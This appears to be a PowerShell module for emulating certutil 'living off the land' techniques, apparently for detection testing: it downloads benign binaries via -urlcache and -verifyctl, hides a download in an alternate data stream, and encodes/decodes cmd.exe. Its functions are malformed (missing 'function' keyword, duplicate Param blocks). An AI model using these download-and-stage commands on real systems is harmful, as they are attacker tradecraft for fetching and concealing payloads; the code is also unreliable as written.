<# 
    .Synopsis
    Certutil abuse techniques

    .Description
    https://lolbas-project.github.io/lolbas/Binaries/Certutil/
    
#>
function Write-Log {
    Param(
    [Parameter(Mandatory=$True)]
    [string] $Message
    )

    # Log file location
    $logfile = $PSScriptRoot + "\logs\certutil.log"

    $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
    $Line = "$Stamp $Message"
    Add-Content $logfile -Value $Line
}

Start-TechniqueOne {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 1 - Download")
    $logged_content += & $lolbinpath -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe $tempdir\7zip.exe

    Write-Log($logged_content)

    # clean up - this should be a seperate function
    Remove-Item -Path $tempdir\*
}

Start-TechniqueTwo {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 2 - Download")
    $logged_content += & $lolbinpath -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe $tempdir\7zip.exe

    Write-Log($logged_content)

    # Clean up
    Remove-Item -Path $tempdir\*
}

Start-TechniqueThree {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 3 - Alternate Data Stream")

    # Staging temp file
    Set-Content $tempdir\1.txt -Value "Hello World"
    # Using invoke-cimmethod because nothing else worked for alternate data stream... something to do with the colon
    $command = "$lolbinpath -urlcache -split -f https://live.sysinternals.com/autoruns.exe $tempdir\1.txt:adsfile"
    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $command}

    # Clean up
    Remove-Item -Path $tempdir\*
}

Start-TechniqueFour {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 4 - Encode")

    $logged_content += & $lolbinpath -encode c:\windows\system32\cmd.exe $tempdir\encoded_file

    Write-Log($logged_content)

    # Clean up
    Remove-Item -Path $tempdir\*
}

Start-TechniqueFive {
    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $lolbinpath
    )

    Param (
        [Parameter(Mandatory=$true, Position=0)]
        [String] $tempdir
    )

    $logged_content = ""

    Write-Log("Technique 5 - Decode")

    $logged_content += & $lolbinpath -decode $tempdir\encoded_file $tempdir\cmd.exe

    Write-Log($logged_content)

    # Clean up
    Remove-Item -Path $tempdir\*
}

function Start-Certutil {

    # Create temp folder
    $tempdir = $PSScriptRoot + "\temp"
    if (-not (Test-Path $tempdir)) {
        New-Item -Path $tempdir -ItemType Directory
    }

    # Target binaries
    if (Test-Path 'c:\windows\system32\certutil.exe') {
        $lolbinpath = 'C:\Windows\System32\certutil.exe'
    }
    else {
        return
    }

    # Run all techniques
    Start-TechniqueOne($lolbinpath, $tempdir)
    Start-TechniqueTwo($lolbinpath, $tempdir)
    Start-TechniqueThree($lolbinpath, $tempdir)
    Start-TechniqueFour($lolbinpath, $tempdir)
    Start-TechniqueFive($lolbinpath, $tempdir)

    # Clean up
    Remove-Item -Path $tempdir -Recurse
}
Export-ModuleMember -Function Start-Certutil